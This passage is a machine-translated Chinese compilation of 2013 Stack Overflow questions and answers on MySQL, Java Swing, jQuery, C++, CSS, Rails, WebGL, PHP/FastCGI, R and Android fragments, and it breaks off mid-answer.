MySQL 似乎不是我的强项。我`timestamp`在现有表中添加了一列，默认值应为`CURRENT_TIMESTAMP`. 但是，所有现有行都有空白时间戳 (0000-00-00 00:00:00)。我想做的是`ts`使用另一个表的时间戳列更新这些行的时间戳列（名为）。我想首先匹配两个表中的两列。所以如果`(tb1.col1 = tb2.col1 AND tb1.col2 = tb2.col2) OR (tb1.col1 = tb2.col2 AND tb1.col2 = tb2.col1`)，则使用`tb2`的时间戳列作为 tb1 的时间戳列中的更新值。

那有意义吗？我将如何编写这样的更新语句？

谢谢阅读。感谢所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:50:23.043

[它非常简单，请参阅文档](http://dev.mysql.com/doc/refman/5.0/en/update.html)中的最后一个示例

```
Update tbl1, tbl2
set 
  tb1.ts = tbl2.ts
WHERE (tb1.col1 = tb2.col1 AND tb1.col2 = tb2.col2) 
   OR (tb1.col1 = tb2.col2 AND tb1.col2 = tb2.col1) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:51:07.657

如果我要对您所要求的内容进行字面解释，它看起来像这样：

```
UPDATE tb1,tb2 SET tb1.ts=tb2.ts
  WHERE (tb1.col1 = tb2.col1 AND tb1.col2 = tb2.col2) OR
    (tb1.col1 = tb2.col2 AND tb1.col2 = tb2.col1) 
```

您可能需要对那里的条件大惊小怪。我希望你有一个测试数据库来让它首先工作。

# java - 替换 GridBagLayout 中的组件

> ID：15262682
> 
> 赞同：2
> 
> 时间：2013-03-07T03:43:23.013
> 
> 标签：java, swing, awt, jpanel, layout-manager

我创建了一个从 JPanel 扩展的类，其布局属性是 GridBagLayout。我基本上需要显示一组 JLabels（网格），但是一旦创建了组件，我就无法替换它。我尝试删除要更改的组件，然后放置新组件，但结果很奇怪。例如，我创建了一个 10x10 JLabels 数组，并希望用以下代码替换 position[0][0] 和 position[9][9]：

```
//At first i have the jpanel layout completely filled

this.remove(0);
this.add((JLabel) start, 0);  //This was created with GridBagLayout.gridx = 0 and GridBagLayout.gridy = 0 and it's fine

this.remove(99);
this.add((JLabel) end, 99); //This was created with GridBagLayout.gridx = 9 and GridBagLayout.gridy = 9 and it's out of grid
this.revalidate(); 
```

但只有 position[0][0] 看起来不错。我应该怎么做才能更换一个组件？

![在此处输入图像描述](../Images/ef186960c73c9436df11aa26e1fcab66.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-07T05:35:59.513

在`GridBagLayout`中，每个组件都与 相关联`GridBagConstraints`。简单地移除一个组件并用相同位置的组件替换它是行不通的，因为新组件将收到一个新的`GridBagConstraints`

但是，您可以做的是获取与给定组件关联的约束。

```
Component toRemove = getComponent(0);
GridBagLayout layout = (GridBagLayout)getLayout();
GridBagConstraints gbc = layout.getConstraints();
remove(toRemove);
add(new JLabel("Happy"), gbc, 0); 
```

这将使用与您要删除的组件相同的约束来添加组件。

当然，这一切都假设您正在分配`gridx`/`gridy`约束......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T19:52:12.970

我使用以下方法解决了我的问题：

```
this.setComponentZOrder(newItem, 0); 
```

所以，我实际上并没有删除 Jpanel 上的对象，而是将新对象放在旧对象上。

# javascript - Firefox 扩展：甚至监听面板内的变化

> ID：15262686
> 
> 赞同：0
> 
> 时间：2013-03-07T03:44:15.947
> 
> 标签：javascript, firefox, firefox-addon, firefox-addon-sdk

我想要一些帮助：

*   Firefox 扩展打开一个面板，从外部网站加载内容
*   如何收听面板内容的变化？它是动态的并且不断更新
*   发生更改时，在浏览器中触发通知（例如“有一些消息！”）

这是一些代码（对不起，但我很菜鸟）：

```
var Widget = require("widget").Widget;

var tabs = require('tabs');

exports.main = function() {

      data = require("self").data

        var Panel = require("panel").Panel({
              width:1000,
              height:630,
              contentURL: "http://mysite.com/news.html",
        });

        require("widget").Widget({
              id: "News",
              label: "News",
              contentURL: "http://mysite.com/images/favicon.ico",
              panel: Panel

            });

        }; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T20:00:31.027

您将希望将一些 contentScript 注入页面 ( [http://mysite.com/news.html](http://mysite.com/news.html) ) 并通过该脚本观察更改。当您看到更改时，您只需向面板发送一条消息，通知插件该更改。

我将注释文档中的示例，

```
// this could be listening to any event happening in the page
var myScript = "window.addEventListener('click', function(event) {" +
               "  var t = event.target;" +
               "  if (t.nodeName == 'A')" +
                    //  this self.port.emit is what sends the 'click-link' signal
                    //  to your add-on code
               "    self.port.emit('click-link', t.toString());" +
               "}, false);"

var panel = require("sdk/panel").Panel({
  contentURL: "http://mysite.com/news.html",
  // !!! use contentScriptFile, this is just for small inline stuff
  contentScript: myScript
});

// this is how your add-on listens for the 'click-link' signal, but it could be any signal name you want
panel.port.on("click-link", function(url) {
  // here is where you fire the "There are some news!" event in the browser
  console.log(url);
}); 
```

# javascript - jQuery $(this) 选择器不起作用

> ID：15262689
> 
> 赞同：0
> 
> 时间：2013-03-07T03:45:14.063
> 
> 标签：javascript, jquery

我正在尝试通过添加一些附加功能来制作一个我正在使用的 jQuery carousel 插件。

```
$("ul#carousel").roundabout();

$("ul#carousel li").click(function() { 
    var id = $(this).attr("id");
    var id_num = id.substr(-1);

    for( var i=0;i<4;i++)
    {
        if(i != id_num)
        {                   
              $("li#list_"+ i +" .table_box").attr("class", "table_box");
        }
    }

    $(this +" .table_box").attr("class", "sub_table_box");
}); 
```

php

```
<ul id="carousel">
<?php
     for($i=0;$i<4;$i++)
     {
          echo "<li id='list_".$i."'>
                   <div class='table_box'>

                   </div>
                </li>";
     }
 ?>
 </ul> 
```

在 Chrome 的 javascript 控制台中，单击列表项后，我收到一条错误消息：

```
 Uncaught Syntax error, unrecognized expression: [object HTMLLIElement] 
```

在我的 jquery-1.7.min.js 文件上。

我认为这可能与插件脚本与其他 js 文件之一冲突有关。但是，jquery noconflict 没有解决任何问题，除非我尝试错了。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T03:46:13.540

这根本不是 jQuery 和 DOM API 的工作方式。`this`是一个 HTML 元素，所以你不能仅仅通过字符串连接它来查询它的子元素。改变

```
$(this +" .table_box") 
```

到

```
$(this).find(".table_box") 
```

> for 循环中的元素呢？我尝试使用 $(this).find("li#list_"+ i +" .table_box").attr("class", "table_box"); 但这没有用。

那是因为`this`已经是一个`<li>`. 你可以用这个替换整个循环：

```
$(this).siblings().find('.sub_table_box').removeClass('sub_table_box').addClass('table_box'); 
```

总结（并添加一些其他样式改进）：

```
$("ul#carousel").on('click', 'li', function() {
    $(this)
        .addClass('sub_table_box');
        .siblings()
        .find('.sub_table_box')
        .removeClass('sub_table_box')
        .addClass('table_box');
}); 
```

# c++ - std::string 函数中的 C++ 分段错误

> ID：15262703
> 
> 赞同：0
> 
> 时间：2013-03-07T03:47:26.450
> 
> 标签：c++, string, gdb, segmentation-fault, allocator

我正在使用 C++ 开发基于 Skyline 查询的算法，使用 RTree 来存储我的数据。如果我处理最多 5 个点，该算法工作正常，然后如果我尝试 6 个点，它会给出分段错误。使用 gdb 我发现问题出在这里：

```
Program received signal SIGSEGV, Segmentation fault.
std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string (
    this=0x7fffffffd7c0, __str=
    <error reading variable: Cannot access memory at address 0xffffffffffffffe8>)
    at /usr/src/debug/gcc-4.7.2-20120921/obj-x86_64-redhat-linux/x86_64-redhat-linux/libstdc++-v3/include/bits/basic_string.tcc:175
175           __str.get_allocator()) 
```

任何人都可以帮助我了解错误在哪里或 ar

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:03:36.843

Mitch Wheat 已经在评论中提出了这个建议，但我认为这实际上是解决您问题的最佳答案，所以：

使用 valgrind。

Valgrind 是一个工具（或者更确切地说，是一组工具），其默认操作模式是运行您的程序并检查内存错误，例如泄漏、缓冲区溢出、未初始化的读取等。

从字面上看，您需要做的就是构建您的程序，最好使用`-g`使其更易于调试的选项，然后像`valgrind my-prog args...`. 然后，当发生不良情况时，Valgrind 将打印出带有堆栈跟踪的详细错误报告。您的问题可能会在不需要使用常规调试器的情况下被发现，我们也不需要猜测问题（如果这是我自己的问题，我也会使用 valgrind）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:09:29.647

鉴于此，我最好的猜测是您正在尝试使用无效的源数据创建一个字符串，可能是一个未初始化的 char 指针或指向一个已被释放的字符串

# html - 可折叠边距 HTML/CSS

> ID：15262704
> 
> 赞同：0
> 
> 时间：2013-03-07T03:47:40.730
> 
> 标签：html, css, margin

我的主题占据了屏幕宽度的 50%，这在较大的屏幕上留下了很好的边距。但是在较小的屏幕上，这会占用宝贵的屏幕空间。是否可以让边距“折叠”以保持主题宽度？或者可能给出可接受的宽度范围？基本上我希望在主题缩小之前缩小边距。

```
<!doctype html>

<html>

  <head>
  </head>

  <body style="margin-left:auto; margin-right:auto; width:50%;">

    <p style="height:100%; background:#878787;">some text</p>

  </body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:02:20.883

您可以考虑使用 CSS`@media`查询。

为确保边距在内容之前缩小，请为内容使用固定的像素宽度，并且`margin: 0 auto`.

当像素宽度比屏幕宽时，使该宽度更小：

```
body {
    width: 500px;
    margin: 0 auto;
}

@media screen and (max-width: 500px) {
    body {
        width: 250px;
    }
} 
```

# ruby-on-rails-3 - 错误“搜索请求中的未知本地索引 'post_core'”

> ID：15262710
> 
> 赞同：0
> 
> 时间：2013-03-07T03:48:23.433
> 
> 标签：ruby-on-rails-3, sphinx, thinking-sphinx

我想把 Thinking Sphinx 放在我的项目 Ruby On Rails 中，我正在使用 ROR 版本 3.2.1 和 Thinking sphinx 3 我**在搜索请求浏览器中收到错误未知本地索引“post_core”** 说我的错误在我的视图中

```
<% @posts.each do |post| %>
  <li><%= post.content %></li>
<% end %> 
```

任何人都可以帮助我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T15:39:20.960

你可能已经解决了你的问题，但无论如何。也许它会帮助别人。

出现此问题的原因是您使用的是 Thinking Sphinx 3.0 或更高版本，但可能以旧方式定义索引，就像在 Thinking Sphinx 2.* 和更早版本中所做的那样。索引定义不再在模型本身中，而是在单独的文件中，这些文件放在`app/indices`. 还有许多其他更改，因此最好仔细阅读新文档。

3.0 的文档在 README 文件中：[https ://github.com/pat/thinking-sphinx/](https://github.com/pat/thinking-sphinx/)

“官方”文档仍然是指旧版本，其工作方式不同： http: [//pat.github.com/ts/en/](http://pat.github.com/ts/en/)

# string - 如何在 VBScript 中将 2 个变量用于 VBScript 中的 InStr 函数

> ID：15262711
> 
> 赞同：2
> 
> 时间：2013-03-07T03:48:28.020
> 
> 标签：string, variables, vbscript

'我需要能够在 instr 函数中使用两个变量（字符串），但它不会返回正确的值，第一个示例是我需要的样式。但似乎无法让它工作。任何帮助将不胜感激。我已经为此工作了 3 天……它让我充满了愤怒。

```
 Option Explicit
    dim message, searchTerm, position

     message = "bob dole was here"
     searchTerm = "dole"

     position = InStr(message, searchTerm)
     'This always returns 0

     position = InStr("bob dole was here", searchTerm)
     'This returns 5, which is accurate

     position = InStr(message, "dole")
     'This returns 0, 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:56:47.413

默认情况下，`InStr(str1, str2)`执行二进制比较。

尝试执行文本比较，如下所示：

```
position = InStr(1, message, searchTerm, 1) 
```

[我想知道这是否是编码问题。消息字符串来自哪里？]

# c++ - 简单的 C++ 声明问题

> ID：15262714
> 
> 赞同：0
> 
> 时间：2013-03-07T03:48:52.530
> 
> 标签：c++, class, pointers

为什么这是非法的，有哪些合乎逻辑的替代方案？

```
// State.h
class State {

public:
int a;
int b;
State z; //  <-- this is this problem

// ... Functions ...

}; 
```

谢谢你。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T03:51:44.070

因为，如果它被允许，每次你创建一个实例时，`State`你都会创建一个实例，`State`然后创建一个实例`State`，并且，那个也需要一个`State`实例，所以它创建一个实例`State`......等等。

它还会在试图找出`sizeof(State)`. 善待你的编译器。

改为保持一种指针，你会没事的。`State`附带说明一下， a拥有自己的 (public)真的有意义`State`吗？我的意思是，我确实喜欢看到如下代码行，但它可能会变得荒谬......

```
if(state.z->z->z->z->z->z->z->z == some_state) {
    // we found the right state!
} 
```

如果您尝试创建单例，请将您的构造函数设为私有并添加一个静态`get_instance`函数，该函数返回`State`.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T03:59:22.630

由于`z`是局部变量，所以在扫描整个`State`类之前，无法知道需要多少存储空间。由于`State`依赖于自身，你将无限递归。

基本上这是编译器中发生的事情：

```
I see a class state.  Okay!
I now see a member variable a.  Okay!  Let's add 4 bytes to the size of our state
I now see a member variable b.  Okay!  Let's add 4 bytes to the size of our state
I now see a State.  Okay!  Let's see, our current size is 4 + 4, 
    now let's add the size of State to that, which is... um... ???? 
```

另一方面，指针在编译时具有已知的大小（通常为 4 个字节，但这取决于您的体系结构。）这样，当您不知道某些东西的大小时，您总是可以有一个指向它的指针，因为大小并不重要。

这就是此时编译器中发生的情况：

```
I see a class state.  Okay!
I now see a member variable a.  Okay!  Let's add 4 bytes to the size of our state
I now see a member variable b.  Okay!  Let's add 4 bytes to the size of our state
I now see a State*.  Okay!   Let's add 4 bytes to the size of our state
I now see that class state has ended.  Its size is 4 + 4 + 4 = 12.
I can now do State z;  It will take 12 bytes of space. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-07T03:51:33.507

不合逻辑，因为这将导致无限数量的**状态 z ，因为****z**的每个实例都会有另一个 z 实例，**依此**类推。指针**状态* z**是允许的，因为它没有这样的限制

 ***** * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T03:52:05.117

改用 a `State *`。这使您可以在某个时候结束递归。****

# html - 将主菜单浮动到站点名称的右侧

> ID：15262720
> 
> 赞同：1
> 
> 时间：2013-03-07T03:50:09.403
> 
> 标签：html, css

你好，我今晚做最简单的任务似乎有点麻烦。试图使我的主菜单浮动到[我的站点](http://onlinebanter.com/)站点名称的右侧。

```
<header>
  <div id="header">
    <div class="g3">
      <h1 id="site-name">
    </div>
  </div>
  <div class="cf"></div>
</header>
<nav>
  <div id="primary-menu" class="g3 nav">
    <ul id="main-menu" class="menu links clearfix">
  </div>
</nav>
 <div class="cf"></div> 
```

我不知道我是否应该粘贴 CSS 代码来帮助我收集到的东西似乎太多了。欢迎您进来看看。不要介意混乱。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:54:49.093

**将此样式添加到标题标签：**

```
header {
 width: 110px;
 float: left;
} 
```

**这给你的导航：**

```
nav {
 float: left;
 width: 800px;
 margin: 10px;
} 
```

# ruby-on-rails - 在 ruby on rails 的刹车中添加 if 语句

> ID：15262724
> 
> 赞同：0
> 
> 时间：2013-03-07T03:50:43.757
> 
> 标签：ruby-on-rails, erb

我认为.html.erb 中有以下内容：

```
<%= form_tag :action=>"edit", :id => @product.id do %> 
```

如果@product 存在（我想不是null），我基本上只想添加id，所以我想做一些类似的事情：

```
<%= form_tag :action=>"edit" if @product print",:id => @product.id" end do %> 
```

我知道上面的代码是错误的，但这就是它背后的想法，不确定我是否可以将它嵌入到 <%= 标记中。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T03:54:26.033

尝试

```
<%= form_tag :action=>"edit", :id => (@product.id if @product) do %> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:59:24.167

```
<%
url_options = { :action => "edit" }
html_options = {}

html_options[:id] = @product.id if @product
%>

<%= form_tag url_options, html_options do %>    
  <% .... %>
<% end %> 
```

*   [http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-form_tag](http://api.rubyonrails.org/classes/ActionView/Helpers/FormTagHelper.html#method-i-form_tag)
*   [http://apidock.com/rails/v3.2.8/ActionView/Helpers/FormTagHelper/form_tag](http://apidock.com/rails/v3.2.8/ActionView/Helpers/FormTagHelper/form_tag)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:02:50.920

这应该有效：

```
<% if @product %>

    <%= form_tag :action=>"edit",:id => @product.id" do %>

<% else %>

    <%= form_tag :action=>"edit" do %>

<% end %> 
```

如果您使用 eval，您可能可以在 <%= ... %> 标记中嵌入条件代码，但上面的内容可能更清楚！

# arrays - WebGL着色器中的常量浮点数组

> ID：15262729
> 
> 赞同：3
> 
> 时间：2013-03-07T03:51:10.527
> 
> 标签：arrays, constants, three.js, webgl, shader

我将 THREE.js 与 WebGL 着色器一起使用。我想在片段着色器中声明一个浮点数数组。GLSL 常量浮点数组的定义如下：

```
#define KERNEL_LENGTH 9
const float kernel[KERNEL_LENGTH] = {
    1.0/16.0, 2.0/16.0, 1.0/16.0,
    2.0/16.0, 4.0/16.0, 2.0/16.0,
    1.0/16.0, 2.0/16.0, 1.0/16.0
}; 
```

我也尝试过：

```
#define KERNEL_LENGTH 9
const float kernel[KERNEL_LENGTH] = float[KERNEL_LENGTH](
    1.0/16.0, 2.0/16.0, 1.0/16.0,
    2.0/16.0, 4.0/16.0, 2.0/16.0,
    1.0/16.0, 2.0/16.0, 1.0/16.0
); 
```

但是对于 WebGL，它们都不起作用。错误信息：

> 错误：0:44：“内核”：数组可能无法声明为常量，因为它们无法初始化错误：0:44：“=”：语法错误

那么我应该如何定义一个 const float 数组呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:09:13.420

将值作为制服传递，而不是尝试做它告诉你不能做的事情：将数组初始化为常量。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T06:31:17.427

随便逛逛：

```
float kernel[KERNEL_LENGTH];
kernel[0] = kernel[4] = kernel[20] = kernel[24] = 1.0/273.0;
kernel[1] = kernel[3] = kernel[5] = kernel[9] = kernel[15] = kernel[19] 
    = kernel[21] = kernel[23] = 4.0/273.0;
kernel[2] = kernel[10] = kernel[14] = kernel[22] = 7.0/273.0;
kernel[6] = kernel[8] = kernel[16] = kernel[18] = 16.0/273.0;
kernel[7] = kernel[11] = kernel[13] = kernel[17] = 26.0/273.0;
kernel[12] = 41.0/273.0; 
```

# java - 在 RCP Eclipse 插件开发过程中使用 Eclipse 版本和 OSGi Equinox 版本有什么区别？

> ID：15262730
> 
> 赞同：0
> 
> 时间：2013-03-07T03:51:11.520
> 
> 标签：java, eclipse, eclipse-plugin, eclipse-rcp

我正在开发 RCP/RAP eclipse 插件开发，在创建项目时它询问 Eclipse 插件针对 Eclipse 还是 OSGi 的目标是什么？

使用两种标准有什么区别？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T09:03:48.287

Eclipse 插件是使用 Eclipse 扩展注册表的 OSGi 包。所以

*   如果您开发普通的 OSGi 项目，请使用*OSGi 框架*选择
*   如果您开发 Eclipse 插件，您很可能需要使用扩展，使用*Eclipse 版本 XY*作为目标。

该收音机还控制更多的向导页面（插件选项和可用模板）和[PDE](http://eclipse.org/pde)中的可用工具。

*OSGi 框架* 下拉选项*Equinox*和*Standard*仅控制插件（捆绑）`MANIFEST.MF`文件是否将增加 E​​clipse 特定的标头`Eclipse-LazyStart`，例如`x-friends`等。

# php - 脚本标题过早结束/信号 11

> ID：15262732
> 
> 赞同：2
> 
> 时间：2013-03-07T03:51:28.373
> 
> 标签：php, wordpress, apache, apc, mod-fcgid

我有一个相当“臃肿”的 WordPress 安装，它使用 apache + mod_Fcgid + apc 引发了一些错误。

我有几个其他 WordPress 站点在此配置下运行没有问题，但是这个特定站点在管理界面中随机抛出“内部错误”并吐出如下日志：

```
[Thu Mar 07 03:37:06 2013] [error] [client 1.2.3.4] Premature end of script headers: php5-fcgi, referer: http://www.example.com/wp-admin/themes.php
[Thu Mar 07 03:37:08 2013] [error] mod_fcgid: process /home/example.com/docs/php5-fcgi(30772) exit(communication error), get unexpected signal 11
[Thu Mar 07 03:37:24 2013] [error] mod_fcgid: process /home/example.com/docs/php5-fcgi(31408) exit(communication error), get unexpected signal 11
[Thu Mar 07 03:37:28 2013] [warn] [client 1.2.3.4] (104)Connection reset by peer: mod_fcgid: error reading data from FastCGI server, referer: http://www.example.com/wp-admin/themes.php
[Thu Mar 07 03:37:28 2013] [error] [client 1.2.3.4] Premature end of script headers: php5-fcgi, referer: http://www.example.com/wp-admin/themes.php
[Thu Mar 07 03:37:29 2013] [error] mod_fcgid: process /home/example.com/docs/php5-fcgi(31410) exit(communication error), get unexpected signal 11
[Thu Mar 07 03:38:31 2013] [warn] [client 1.2.3.4] (104)Connection reset by peer: mod_fcgid: error reading data from FastCGI server, referer: http://www.example.com/wp-admin/widgets.php
[Thu Mar 07 03:38:31 2013] [error] [client 1.2.3.4] Premature end of script headers: php5-fcgi, referer: http://www.example.com/wp-admin/widgets.php
[Thu Mar 07 03:38:34 2013] [error] mod_fcgid: process /home/example.com/docs/php5-fcgi(31412) exit(communication error), get unexpected signal 11 
```

我为 mod_fcgid 设置了以下值：

```
FcgidMaxRequestInMem 131072
FcgidBusyTimeout 3600
FcgidIOTimeout 600 
```

关于还有什么需要调整的建议？

## 更新

看起来问题仅在启用 APC 时发生。如果我禁用 APC，一切都很好。并且它不是引发错误的同一页面。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-22T11:01:29.523

删除 PHP 的 suhosin 模块解决了这里的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-09T01:54:10.787

我终于找到了这个。事实证明，这个特定的 WordPress 站点导致我的 apc 段大小超载。我增加了内存，我的问题已经解决了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-09T00:30:36.163

在我看来，您好像错过了`}`某个地方，但您并没有真正付出太多努力。我怀疑这是 FastCGI 本身的问题。

如果禁用所有插件，错误会消失吗？如果是这样，请一次重新启用它们，直到找到罪魁祸首。

另外，尝试切换到默认的 wordpress 主题。在缩小范围之前，您需要进行更多故障排除。

# javascript - 如何在 java 脚本或 jquery 中禁用浏览器 url 的复制粘贴？

> ID：15262733
> 
> 赞同：-3
> 
> 时间：2013-03-07T03:51:28.873
> 
> 标签：javascript

如何在 java 脚本或 j 查询中禁用浏览器 URL 的复制粘贴。我从谷歌尝试了很多，但我还没有找到解决这个问题的确切解决方案。我得到的所有解决方案要么禁用 Web 浏览器主体，要么禁用任何特定字段。

我被困在这个问题上，请任何人帮助我。

浏览器支持 IE9 和 firefox 14+。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T03:55:49.733

你不能。至于为什么人们对你投反对票，即使你的问题有点形式良好，我认为那是因为人们绝对讨厌这个想法。所以不要这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T03:55:29.627

你不能。地址栏是浏览器的一部分，您的网页无法访问。

# r - 使用来自另一列的数据添加数据列

> ID：15262742
> 
> 赞同：0
> 
> 时间：2013-03-07T03:52:14.743
> 
> 标签：r

我正在尝试从线性回归模型中绘制预测值。如何将使用我的数据列之一作为因素的预测值插入数据框中？我的数据框如下所示：

```
 score age rank 
  1  3.03  65    1         
  2  4.31  47    1       
  3  5.09  49    1       
  4  3.71  41    1        
  5  5.29  40    1         
  6  2.70  61    1 
```

我已经根据我的 lm 预测了每个等级的分数（有 3 个），我想将它们插入到数据框中，以便我可以根据年龄绘制预测分数。预测分数为：

```
Rank 1 predicted tolerance score: (8.2+0)+(-.085+0)= 8.2 - .085 age
Rank 2 predicted tolerance score: (8.2-4.0)+(-.085+.103)=4.2 +.018 age
Rank 3 predicted tolerance score: (8.2-2.78)+(-.085+.07)=5.42 - .015 age
  Thank you! 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T03:56:20.323

你可以这样做：

```
coefs = c(.085, .018, .015)
intercepts = c(8.2, 4.2, 5.42)
d$predicted = intercepts[d$rank] + coefs[d$rank] * d$age 
```

（假设您的数据框被称为`d`）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T03:56:51.277

另一种方法：

```
parms <- data.frame(rank=1:3,int=c(8.2,4.2,5.42),slope=c(-0.85,0.017,-0.015))
mydata <- merge(mydata,parms)
mydata <- transform(mydata,predval=int+age*slope) 
```

如果您有一组数据（即这些系数基于您要预测的相同数据）

```
lmfit <- lm(score~age*rank,data=mydata)
mydata$pred <- predict(lmfit) 
```

# java - Google App Engine (Java) - JDO PersistenceManager makePersistentAll 变慢

> ID：15262744
> 
> 赞同：1
> 
> 时间：2013-03-07T03:52:36.473
> 
> 标签：java, google-app-engine, google-cloud-datastore, jdo

我有一个迷你 CRM 应用程序。我正在尝试添加功能以允许批量用户导入。上传处理程序从 CSV 文件中读取数据，然后调用我的 CustomerService 类将 Customer 对象存储在数据存储中：

```
public int createCustomers(final List<Customer> customers) {
    List<List<Customer>> buckets = bucketList(customers);
    int bucketCount = 0;
    PersistenceManager persistenceManager = PMF.get().getPersistenceManager();
    for(List<Customer> bucket: buckets) {
        Collection<Customer> makePersistentAll = persistenceManager.makePersistentAll(bucket);
    }           
    return customers.size();        
} 
```

bucketList 方法只是将一个大列表分解为较小的列表。我这样做是为了尝试调整应用程序并查看 makePersistentAll 调用是否存在最佳大小。我目前将其设置为 1000，并且正在使用包含 100,000 条记录的 CSV 文件进行测试。随着更多记录的添加，该应用程序似乎变得越来越慢，特别是在 60K 记录标记附近。我尝试将 Customer 中的所有字段设置为未编入索引，但这似乎没有任何明显的区别：

```
@PersistenceCapable
public class Customer implements Serializable {

@PrimaryKey
@Persistent(valueStrategy = IdGeneratorStrategy.IDENTITY)
private Key key;

@Extension(vendorName="datanucleus", key="gae.unindexed", value="true")
@Persistent
private String accountNumber;
@Extension(vendorName="datanucleus", key="gae.unindexed", value="true")
@Persistent
private String email;
@Extension(vendorName="datanucleus", key="gae.unindexed", value="true")
@Persistent
private String firstName;
@Extension(vendorName="datanucleus", key="gae.unindexed", value="true")
@Persistent
private String lastName;
    ... 
```

我已经在开发（本地）以及生产 App Engine 中对此进行了测试，但无济于事。我认为这是一个比较常见的用例，将大量数据导入系统并快速保存到数据存储区。我已经尝试了很多方法来让它工作： - 使用 AsyncDatastoreService - 一个一个地保存客户对象（makePersistent） - 使用客户中的 Key 对象作为主键 - 使用 accountNumber 字符串作为主键

但似乎没什么大不了的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:54:02.500

建议您查看[http://www.datanucleus.org/products/accessplatform_3_2/jdo/performance_tuning.html](http://www.datanucleus.org/products/accessplatform_3_2/jdo/performance_tuning.html)特别是关于大量对象的“持久性过程”。您可以减少泵入的对象数量，`"makePersistentAll()"`以便您有多个调用。显然，GAE/Datastore 可能存在一些奇怪的情况，可能会导致这种情况

# android - 刷新或强制重绘片段

> ID：15262747
> 
> 赞同：54
> 
> 时间：2013-03-07T03:53:23.850
> 
> 标签：android, android-fragments

我有一个扩展 xml 布局的片段。我的要求是在我的活动恢复时更新片段内所有视图的文本大小。我试过了

```
 fragment.getView().invalidate(); 
```

这似乎没有做这项工作。我也试过

```
 fragment.getView().requestLayout(); 
```

这也不起作用。

在另一个活动中，我有一个 ListFragment 需要做同样的事情。我试过了

```
 listfragment.getListView().invalidate(); 
```

这**成功了**，刷新了我的列表视图并重绘了其中的所有项目。

我不明白为什么一个有效，而另一个无效。

我还看到有人建议启动一个**片段事务**并用一个新片段替换当前片段，这让我一直想知道

1.  当我只需要刷新我的片段包含的视图上的文本时，我为什么要创建一个全新的片段并替换我当前的片段。

2.  片段事务方法将阻止我在我的活动的布局 xml 中定义我的片段，我将不得不以编程方式将片段插入到正确的位置。

有什么简单的方法吗？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2014-04-18T08:45:09.103

我不认为有办法做到这一点。片段在 onCreateView() 上重建它的 UI ...但是在创建或重新创建片段时会发生这种情况。

您必须实现自己的 updateUI 方法，或者在哪里指定哪些元素以及它们应该如何更新。这是一个很好的做法，因为无论如何在创建片段时都需要这样做。

但是，如果这还不够，你可以做一些事情，比如用相同的片段替换片段，强制它调用`onCreateView()`

```
FragmentTransaction tr = getFragmentManager().beginTransaction();
tr.replace(R.id.your_fragment_container, yourFragmentInstance);
tr.commit() 
```

**笔记**

要刷新 ListView，您需要调用`notifyDataSetChanged()`ListView 的适配器。

* * *

## 回答 #2

> 赞同：25
> 
> 时间：2015-02-01T03:42:28.783

就我而言，`detach`并且`attach`工作：

```
 getSupportFragmentManager()
   .beginTransaction()
   .detach(contentFragment)
   .attach(contentFragment)
   .commit(); 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2017-06-01T06:06:52.120

使用以下代码再次刷新片段：

```
FragmentTransaction ftr = getFragmentManager().beginTransaction();                          
ftr.detach(EnterYourFragmentName.this).attach(EnterYourFragmentName.this).commit(); 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2016-12-22T09:35:19.190

`detach().detach()`支持库更新 25.1.0（可能更早）后无法正常工作。此解决方案在更新后工作正常：

```
getSupportFragmentManager()
    .beginTransaction()
    .detach(oldFragment)
    .commitNowAllowingStateLoss();

getSupportFragmentManager()
    .beginTransaction()
    .attach(oldFragment)
    .commitAllowingStateLoss(); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-08-23T15:09:03.773

为了解决这个问题，我使用这个：

```
Fragment frg = null;
frg = getFragmentManager().findFragmentByTag("Feedback");
final android.support.v4.app.FragmentTransaction ft = getFragmentManager().beginTransaction();
ft.detach(frg);
ft.attach(frg);
ft.commit(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-02-04T13:18:23.977

这在 Fragment 中对我有用：

```
Fragment frg = null;
Class fragmentClass;
fragmentClass = MainFragment.class;

try {
    frg = (android.support.v4.app.Fragment)     
    fragmentClass.newInstance();
